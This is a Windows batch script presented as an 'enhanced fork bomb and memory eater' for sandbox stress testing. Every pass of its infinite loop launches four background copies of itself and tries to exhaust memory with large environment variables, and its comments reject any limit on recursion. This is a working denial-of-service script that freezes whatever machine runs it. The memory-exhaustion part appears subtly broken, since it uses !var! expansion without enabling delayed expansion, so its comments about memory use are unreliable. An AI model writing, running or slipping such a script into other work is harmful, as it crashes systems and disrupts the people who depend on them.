@echo off
:: Enhanced fork bomb + memory eater for Windows Sandbox testing
:: Original: %0|%0
:: This version launches 4 parallel recursive instances and allocates memory

title STRESS_TEST_DO_NOT_RUN_ON_REAL_SYSTEM

:: Limit recursion depth to avoid complete freeze? No - for testing, we want full load.
:: But we add a small delay to ensure process creation doesn't crash too fast.

set /a counter=0

:loop
:: Launch 4 copies of itself in parallel
start "" /b %0
start "" /b %0
start "" /b %0
start "" /b %0

:: Also consume memory: create large environment variable (approx 100MB)
:: Repeat every few iterations to accumulate memory pressure
set "garbage="
for /l %%i in (1,1,1000000) do set "garbage=!garbage!X"
set "garbage2="
for /l %%i in (1,1,1000000) do set "garbage2=!garbage2!X"

:: Infinite loop to keep CPU busy
goto loop